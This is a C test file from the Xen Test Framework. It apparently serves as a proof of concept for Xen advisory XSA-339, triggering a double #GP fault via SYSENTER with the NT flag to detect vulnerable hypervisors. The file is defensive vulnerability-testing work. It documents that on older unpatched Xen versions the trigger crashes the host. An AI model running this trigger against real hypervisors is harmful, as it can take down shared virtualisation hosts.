/**
 * @file tests/xsa-339/main.c
 * @ref test-xsa-339
 *
 * @page test-xsa-339 XSA-339
 *
 * Advisory: [XSA-339](https://xenbits.xen.org/xsa/advisory-339.html)
 *
 * Xen, in the fix for XSA-44, started raising @#GP in the guest for a
 * SYSENTER with NT set.  This is buggy to begin with, but combined with
 * separate bug for 32bit PV guests, which caused the fault to be raised
 * twice.
 *
 * Execute SYSENTER, with NT set, and try to sift through the many possible
 * results.
 *
 * 1. On AMD/Hygon hardware, SYSENTER is unusable, and will result in @#UD
 *    directly in userspace.
 * 2. On versions of Xen without XSA-44 fixed, Xen will crash.
 * 3. On versions of Xen with XSA-44, 339 and the buggy @#GP behaviour fixed,
 *    the SYSENTER will execute normally and land at the registered callback.
 *    Fix up user state and return with no fault latched.
 * 4. On versions of Xen with XSA-44 and 339 fixed, a @#GP will be delivered
 *    with SYSENTER semantics.  Fix up user state, and return with a @#GP
 *    fault latched (if case 5 not already latched).
 * 5. On versions of Xen with XSA-44 fixed, but 339 unfixed, a second @#GP
 *    fault will be delivered on top of case 4, pointing at the @#GP fault
 *    handler.  Note this with EXINFO_AVAIL0, and treat it as having trap
 *    semantics, so that returning from it will then continue running case 4.
 *
 * @see tests/xsa-339/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-339 PoC";

void entry_GP(void);

static unsigned long __user_text sysenter_nt(void)
{
    exinfo_t fault = 0;

    /* Use the SYSEXIT ABI.  Return %rsp in %rcx, %rip in %rdx. */
    asm volatile ("mov %%"_ASM_SP", %%"_ASM_CX";"
#ifdef __x86_64__
                  "lea 3f(%%rip), %%rdx;"
#else
                  "call 1f;"
                  "1: pop %%edx;"
                  "add $3f - 1b, %%edx;"
#endif
                  "pushf;"
                  "orl $"STR(X86_EFLAGS_NT)", (%%"_ASM_SP");"
                  "popf;"
                  "2: sysenter;"
                  "3:"
                  _ASM_EXTABLE_HANDLER(2b, 3b, %P[rec])
                  : "+a" (fault)
                  : [rec] "p" (ex_record_fault_eax)
                  : "ecx", "edx");

    return fault;
}

static void fixup_sysenter_state(struct cpu_regs *regs)
{
    regs->cs = __USER_CS;
    regs->ip = regs->dx;
    regs->eflags &= ~X86_EFLAGS_NT;
    regs->_ss = __USER_DS;
    regs->_sp = regs->cx;
}

void do_sysenter(struct cpu_regs *regs)
{
    fixup_sysenter_state(regs);
}

bool do_unhandled_exception(struct cpu_regs *regs)
{
    exinfo_t ex = EXINFO(regs->entry_vector, regs->error_code);

    /*
     * First buggy #GP, and the subject of XSA-339.  Points at the #GP handler
     * in kernel mode.
     */
    if ( ex == EXINFO_SYM(GP, 0) && regs->ip == _u(entry_GP) &&
         (regs->cs & X86_SEL_RPL_MASK) == IS_DEFINED(CONFIG_32BIT) )
    {
        regs->ax = EXINFO_AVAIL0;
        return true;
    }

    /*
     * Second buggy #GP, not a security issue.  Invoked with SYSENTER
     * semantics, so all calling state discarded.  Don't clobber EXINFO_AVAIL0
     * in the fault information if we're unwnding the XSA case.
     */
    if ( ex == EXINFO_SYM(GP, 0) && regs->ip == 0 &&
         (regs->cs & X86_SEL_RPL_MASK) == 3 )
    {
        if ( regs->ax != EXINFO_AVAIL0 )
            regs->ax = ex;

        fixup_sysenter_state(regs);
        return true;
    }

    return false;
}

void test_main(void)
{
    exinfo_t fault = exec_user(sysenter_nt);

    switch ( fault )
    {
    case EXINFO_AVAIL0:
        return xtf_failure("Fail: Vulnerable to XSA-399\n");

    case 0:
    case EXINFO_SYM(UD, 0):
    case EXINFO_SYM(GP, 0):
        return xtf_success("Success: Not vulnerable to XSA-339\n");

    default:
        return xtf_error("Unexpected fault %#x, %pe\n", fault, _p(fault));
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
